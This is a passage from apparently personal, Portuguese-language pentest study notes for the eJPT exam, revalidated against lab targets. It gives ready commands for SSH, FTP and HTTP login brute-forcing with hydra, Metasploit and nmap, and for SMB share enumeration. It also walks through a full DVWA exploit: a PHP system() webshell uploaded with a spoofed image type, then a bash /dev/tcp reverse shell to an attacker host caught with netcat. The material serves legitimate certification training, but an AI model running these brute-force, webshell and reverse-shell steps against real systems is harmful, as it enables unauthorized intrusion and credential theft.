`john --list=formats | tr ',' '\n' | grep -i md5`.

## F.6 SSH nesta máquina (hydra não tem, estas três rotas têm)

```bash
# 1) ssh_brute.py — mais rápido (usa python do venv, senão falta paramiko)
~/venvs/pentest/bin/python ~/LIBERTUS/ejpt/ssh_brute.py -t IP -p 22 -l users.txt -P pass.txt -T 8

# 2) Metasploit ssh_login — abre sessão direto (VERBOSE true para ver o acerto)
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS IP; set USERNAME root; \
 set PASS_FILE /home/libertus/wordlists/pass/top10k.txt; set STOP_ON_SUCCESS true; \
 set VERBOSE true; run; exit"

# 3) nmap
nmap -p22 --script ssh-brute --script-args userdb=users.txt,passdb=pass.txt IP
```
Hoje: `msfadmin:msfadmin` achado em 0,1 s contra o lab em 127.0.0.1:2222.

---

# ADENDO 23/OUT — REVALIDAÇÃO DA VÉSPERA (tudo abaixo rodou hoje)

## G.1 hydra — o veredito correto não é "não presta", é "só onde ele tem módulo"
```bash
# FUNCIONA (testado hoje 18:08, alvo vsftpd 3.0.2 em 127.0.0.1:2121)
hydra -l msfadmin -P ~/wordlists/pass/top10k.txt -t 4 -f ftp://IP:21
# -> [21][ftp] host: IP  login: msfadmin  password: msfadmin   (1 s)

# NÃO FUNCIONA nesta máquina
hydra ... ssh://IP          # [ERROR] Compiled without LIBSSH
hydra ... rdp://IP          # idem

# HTTP-POST: só com F= explícito E confirmação na mão depois
hydra -l admin -P ~/wordlists/pass/top1000.txt IP -s 8080 http-post-form \
  "/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
# token CSRF (DVWA) quebra esse comando -> usar web_login.py + sqlmap/requests
```
Regra: **hydra que "achou" não é prova.** Confirmar sempre (`curl -i`, `ssh`, cliente do serviço).

## G.2 nmap — não misturar `-sV` com lista de scripts
Hoje `nmap -sV --script "ftp-anon,ftp-syst,ftp-vsftpd-backdoor"` disparou `vmware-version` e
`rpcinfo` (erro) numa porta FTP — ruído de version-detection. Faça em duas etapas:
```bash
nmap -Pn -sV -p 21 IP
nmap -Pn -p 21 --script ftp-anon,ftp-syst IP       # scripts puros, saída limpa
```
Os scripts moram em `/snap/nmap/5432/usr/share/nmap/scripts` (o caminho `/snap/nmap/current/share/...`
não existe). Teste de vida: `nmap --script-help http-enum`.

## G.3 SMB no lab — IPs e a verdade sobre MS17-010
```bash
nmap -Pn -p 445 --script smb-os-discovery,smb-security-mode,smb-enum-shares 172.28.77.11
```
Resultado real hoje: host `SRVLEGACY`, workgroup `LAB`, SMB1 (NT1), signing off, guest READ/WRITE em
`publico` e `IPC$`, `financeiro`/`rh` sem acesso anônimo.
**Limite honesto:** é Samba, não Windows — `smb_ms17_010` responde "does NOT appear vulnerable"
(correto). EternalBlue só se treina em Windows (HTB/Metasploitable3). No exame, se o 445 for Windows,
o fluxo do Cenário A vale integralmente; se for Samba, o alvo é enumeração + creds fracas.

## G.4 Python do lab — a regra que quebra scripts
```bash
~/venvs/pentest/bin/python ~/LIBERTUS/ejpt/web_login.py -u http://IP/login.php -l admin -p password
# instalar algo NO VENV (não existe bin/pip):
uv pip install --python ~/venvs/pentest/bin/python <pacote>
```
`pip3` do PATH instala no Python 3.14 do Hermes — não no venv. `python3` puro não tem paramiko/requests.

## G.5 tempos reais medidos hoje (para não travar no exame)
| Ação | Tempo |
|---|---|
| `nmap -sV -p- -T4` num host de lab | 1–4 min |
| `gobuster` common.txt (4.750) | ~15 s |
| `sqlmap --dbs` autenticado | ~40 s |
| hydra FTP 10k senhas, 1 user | ~2–5 min |
| `smb-enum-shares` | ~35 s (script pesado) |

## G.6 Web → RCE: upload de webshell validado hoje (ponta a ponta)
```bash
printf '<?php system($_GET["c"]); ?>' > /tmp/shell.php
curl -s -b "PHPSESSID=XXX; security=low" \
  -F "uploaded=@/tmp/shell.php;type=image/jpeg" -F "Upload=Upload" \
  http://IP/vulnerabilities/upload/
curl -s "http://IP/hackable/uploads/shell.php?c=id"        # -> uid=33(www-data)
# reverse (URL-encode o comando):
# bash -c 'bash -i >& /dev/tcp/LHOST/4444 0>&1'
nc -lvnp 4444
```
Hoje a conexão voltou e o shell respondeu `id`, `hostname` e `pwd`. Botão é `Upload` (U maiúsculo).





